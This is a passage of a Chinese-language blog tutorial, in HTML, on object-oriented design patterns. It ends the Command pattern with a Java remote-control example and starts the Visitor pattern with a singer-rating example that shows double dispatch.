class="hljs-comment">// TODO Auto-generated method stub</span><br>      <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>RemoteController.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteController</span> &#123;<br><br>   <span class="hljs-comment">// 开 按钮的命令数组</span><br>   Command[] onCommands;<br>   Command[] offCommands;<br><br>   <span class="hljs-comment">// 执行撤销的命令</span><br>   Command undoCommand;<br><br>   <span class="hljs-comment">// 构造器，完成对按钮初始化</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteController</span><span class="hljs-params">()</span> &#123;<br><br>      onCommands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Command</span>[<span class="hljs-number">5</span>];<br>      offCommands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Command</span>[<span class="hljs-number">5</span>];<br><br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>         onCommands[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoCommand</span>();<br>         offCommands[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoCommand</span>();<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-comment">// 给我们的按钮设置你需要的命令</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCommand</span><span class="hljs-params">(<span class="hljs-type">int</span> no, Command onCommand, Command offCommand)</span> &#123;<br>      onCommands[no] = onCommand;<br>      offCommands[no] = offCommand;<br>   &#125;<br><br>   <span class="hljs-comment">// 按下开按钮</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onButtonWasPushed</span><span class="hljs-params">(<span class="hljs-type">int</span> no)</span> &#123; <span class="hljs-comment">// no 0</span><br>      <span class="hljs-comment">// 找到你按下的开的按钮， 并调用对应方法</span><br>      onCommands[no].execute();<br>      <span class="hljs-comment">// 记录这次的操作，用于撤销</span><br>      undoCommand = onCommands[no];<br><br>   &#125;<br><br>   <span class="hljs-comment">// 按下开按钮</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">offButtonWasPushed</span><span class="hljs-params">(<span class="hljs-type">int</span> no)</span> &#123; <span class="hljs-comment">// no 0</span><br>      <span class="hljs-comment">// 找到你按下的关的按钮， 并调用对应方法</span><br>      offCommands[no].execute();<br>      <span class="hljs-comment">// 记录这次的操作，用于撤销</span><br>      undoCommand = offCommands[no];<br><br>   &#125;<br>   <br>   <span class="hljs-comment">// 按下撤销按钮</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undoButtonWasPushed</span><span class="hljs-params">()</span> &#123;<br>      undoCommand.undo();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>TVOffCommand.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TVOffCommand</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Command</span> &#123;<br><br>   <span class="hljs-comment">// 聚合TVReceiver</span><br><br>   TVReceiver tv;<br><br>   <span class="hljs-comment">// 构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">TVOffCommand</span><span class="hljs-params">(TVReceiver tv)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.tv = tv;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// 调用接收者的方法</span><br>      tv.off();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// 调用接收者的方法</span><br>      tv.on();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>TVOnCommand.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TVOnCommand</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Command</span> &#123;<br><br>   <span class="hljs-comment">// 聚合TVReceiver</span><br><br>   TVReceiver tv;<br><br>   <span class="hljs-comment">// 构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">TVOnCommand</span><span class="hljs-params">(TVReceiver tv)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.tv = tv;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// 调用接收者的方法</span><br>      tv.on();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// 调用接收者的方法</span><br>      tv.off();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>TVReceiver.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TVReceiver</span> &#123;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">on</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; 电视机打开了.. &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">off</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; 电视机关闭了.. &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs abnf">--------按下灯的开按钮-----------<br> 电灯打开了.. <br>--------按下灯的关按钮-----------<br> 电灯关闭了.. <br>--------按下撤销按钮-----------<br> 电灯打开了.. <br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>使用遥控器操作电视机<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>--------按下电视机的开按钮-----------<br> 电视机打开了.. <br>--------按下电视机的关按钮-----------<br> 电视机关闭了.. <br>--------按下撤销按钮-----------<br> 电视机打开了..<br></code></pre></td></tr></table></figure><h2 id="命令模式的注意事项和细节"><a class="markdownIt-Anchor" href="#命令模式的注意事项和细节"></a> 命令模式的注意事项和细节</h2><ol><li><p>将发起请求的对象与执行请求的对象解耦。发起请求的对象是调用者，调用者只要调用命令对象的 execute()方法就可以让接收者工作，而不必知道具体的接收者对象是谁、是如何实现的，命令对象会负责让接收者执行请求的动作，也就是说：”请求发起者”和“请求执行者”之间的解耦是通过命令对象实现的，命令对象起到了纽带桥梁的作用。</p></li><li><p>容易设计一个命令队列。只要把命令对象放到列队，就可以多线程的执行命令</p></li><li><p>容易实现对请求的撤销和重做</p></li><li><p><strong>命令模式不足</strong>：可能导致某些系统有过多的具体命令类，增加了系统的复杂度，这点在在使用的时候要注意</p></li><li><p><strong>空命令也是一种设计模式</strong>，它为我们<strong>省去了判空的操作</strong>。在上面的实例中，如果没有用空命令，我们每按下一个按键都要判空，这给我们编码带来一定的麻烦。</p></li><li><p>命令模式经典的应用场景：界面的一个按钮都是一条命令、模拟 CMD（DOS 命令）订单的撤销/恢复、触发-反馈机制</p></li></ol><h1 id="访问者模式"><a class="markdownIt-Anchor" href="#访问者模式"></a> 访问者模式</h1><p>在访问者模式（Visitor Pattern）中，我们使用了一个访问者类，它改变了元素类的执行算法。通过这种方式，元素的执行算法可以随着访问者改变而改变。这种类型的设计模式属于行为型模式。根据模式，元素对象已接受访问者对象，这样访问者对象就可以处理元素对象上的操作。</p><h2 id="介绍-14"><a class="markdownIt-Anchor" href="#介绍-14"></a> 介绍</h2><p><strong>意图：</strong> 主要将数据结构与数据操作分离。</p><p><strong>主要解决：</strong> 稳定的数据结构和易变的操作耦合问题。</p><p><strong>何时使用：</strong> 需要对一个对象结构中的对象进行很多不同的并且不相关的操作，而需要避免让这些操作&quot;污染&quot;这些对象的类，使用访问者模式将这些封装到类中。</p><p><strong>如何解决：</strong> 在被访问的类里面加一个对外提供接待访问者的接口。</p><p><strong>关键代码：</strong> 在数据基础类里面有一个方法接受访问者，将自身引用传入访问者。</p><p><strong>应用实例：</strong> 您在朋友家做客，您是访问者，朋友接受您的访问，您通过朋友的描述，然后对朋友的描述做出一个判断，这就是访问者模式。</p><p><strong>优点：</strong> 1、符合单一职责原则。 2、优秀的扩展性。 3、灵活性。</p><p><strong>缺点：</strong> 1、具体元素对访问者公布细节，违反了迪米特原则。 2、具体元素变更比较困难。 3、违反了依赖倒置原则，依赖了具体类，没有依赖抽象。</p><p><strong>使用场景：</strong> 1、对象结构中对象对应的类很少改变，但经常需要在此对象结构上定义新的操作。<br />2、需要对一个对象结构中的对象进行很多不同的并且不相关的操作，而需要避免让这些操作&quot;污染&quot;这些对象的类，也不希望在增加新操作时修改这些类。</p><p><strong>注意事项：</strong> 访问者可以对功能进行统一，可以做报表、UI、拦截器与过滤器。</p><p><strong>访问者模式的原理类图:</strong><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103191915903.png" alt="image-20230103191915903" /></p><p>对原理类图的说明-即(访问者模式的角色及职责)</p><ol><li><p>Visitor 是抽象访问者，为该对象结构中的 ConcreteElement 的每一个类声明一个 visit 操作</p></li><li><p>ConcreteVisitor ：是一个具体的访问值 实现每个有 Visitor 声明的操作，是每个操作实现的部分.</p></li><li><p>ObjectStructure 能枚举它的元素， 可以提供一个高层的接口，用来允许访问者访问元素</p></li><li><p>Element 定义一个 accept 方法，接收一个访问者对象</p></li><li><p>ConcreteElement 为具体元素，实现了 accept 方法</p></li></ol><h2 id="实现-12"><a class="markdownIt-Anchor" href="#实现-12"></a> 实现</h2><p>完成测评系统需求</p><ol><li>将观众分为男人和女人，对歌手进行测评，当看完某个歌手表演后，得到他们对该歌手不同的评价(评价 有不同的种类，比如 成功、失败 等)</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103191809297.png" alt="image-20230103191809297" /></p><p><code>Action.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Action</span> &#123;<br>   <br>   <span class="hljs-comment">//得到男性 的测评</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getManResult</span><span class="hljs-params">(Man man)</span>;<br>   <br>   <span class="hljs-comment">//得到女的 测评</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getWomanResult</span><span class="hljs-params">(Woman woman)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//创建ObjectStructure</span><br>      <span class="hljs-type">ObjectStructure</span> <span class="hljs-variable">objectStructure</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectStructure</span>();<br>      <br>      objectStructure.attach(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Man</span>());<br>      objectStructure.attach(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Woman</span>());<br>      <br>      <br>      <span class="hljs-comment">//成功</span><br>      <span class="hljs-type">Success</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Success</span>();<br>      objectStructure.display(success);<br>      <br>      System.out.println(<span class="hljs-string">&quot;~~~~~~~~~~~~~~~~~~~~~~~~~~&quot;</span>);<br>      <span class="hljs-type">Fail</span> <span class="hljs-variable">fail</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Fail</span>();<br>      objectStructure.display(fail);<br>      <br>      System.out.println(<span class="hljs-string">&quot;~~~~~~~~~~~给的是待定的测评~~~~~~~~~~~&quot;</span>);<br>      <br>      <span class="hljs-type">Wait</span> <span class="hljs-variable">wait</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Wait</span>();<br>      objectStructure.display(wait);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Fail.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fail</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Action</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getManResult</span><span class="hljs-params">(Man man)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 男人给的评价该歌手失败 !&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getWomanResult</span><span class="hljs-params">(Woman woman)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 女人给的评价该歌手失败 !&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Man.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Man</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Action action)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      action.getManResult(<span class="hljs-built_in">this</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ObjectStructure.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">import</span> java.util.LinkedList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">//数据结构，管理很多人（Man , Woman）</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectStructure</span> &#123;<br><br>   <span class="hljs-comment">//维护了一个集合</span><br>   <span class="hljs-keyword">private</span> List&lt;Person&gt; persons = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();<br>   <br>   <span class="hljs-comment">//增加到list</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attach</span><span class="hljs-params">(Person p)</span> &#123;<br>      persons.add(p);<br>   &#125;<br>   <span class="hljs-comment">//移除</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">detach</span><span class="hljs-params">(Person p)</span> &#123;<br>      persons.remove(p);<br>   &#125;<br>   <br>   <span class="hljs-comment">//显示测评情况</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">(Action action)</span> &#123;<br>      <span class="hljs-keyword">for</span>(Person p: persons) &#123;<br>         p.accept(action);<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Person.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>   <br>   <span class="hljs-comment">//提供一个方法，让访问者可以访问</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Action action)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Success.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Success</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Action</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getManResult</span><span class="hljs-params">(Man man)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 男人给的评价该歌手很成功 !&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getWomanResult</span><span class="hljs-params">(Woman woman)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 女人给的评价该歌手很成功 !&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Wait.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Wait</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Action</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getManResult</span><span class="hljs-params">(Man man)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 男人给的评价是该歌手待定 ..&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getWomanResult</span><span class="hljs-params">(Woman woman)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 女人给的评价是该歌手待定 ..&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Woman.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-comment">//说明</span><br><span class="hljs-comment">//1. 这里我们使用到了双分派, 即首先在客户端程序中，将具体状态作为参数传递Woman中(第一次分派)</span><br><span class="hljs-comment">//2. 然后Woman 类调用作为参数的 &quot;具体方法&quot; 中方法getWomanResult, 同时将自己(this)作为参数</span><br><span class="hljs-comment">//   传入，完成第二次的分派</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Woman</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span>&#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Action action)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      action.getWomanResult(<span class="hljs-built_in">this</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> 男人给的评价该歌手很成功 !</span><br><span class="hljs-section"> 女人给的评价该歌手很成功 !</span><br><span class="hljs-section">~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-code"> 男人给的评价该歌手失败 !</span><br><span class="hljs-code"> 女人给的评价该歌手失败 !</span><br>~~~~~~~~~~~给的是待定的测评~~~~~~~~~~~<br><span class="hljs-code"> 男人给的评价是该歌手待定 ..</span><br><span class="hljs-code"> 女人给的评价是该歌手待定 ..</span><br></code></pre></td></tr></table></figure><blockquote><p>应用案例的小结-双分派</p></blockquote><ol><li><p>上面提到了双分派，所谓双分派是指不管类怎么变化，我们都能找到期望的方法运行。双分派意味着得到执行的操作取决于请求的种类和两个接收者的类型</p></li><li><p>以上述实例为例，<strong>假设我们要添加一个 Wait 的状态类，考察 Man 类和 Woman 类的反应</strong>，由于使用了双分派，只需增加一个 Action 子类即可在客户端调用即可，<strong>不需要改动任何其他类的代码</strong>。</p></li></ol><h2 id="访问者模式的注意事项和细节"><a class="markdownIt-Anchor" href="#访问者模式的注意事项和细节"></a> 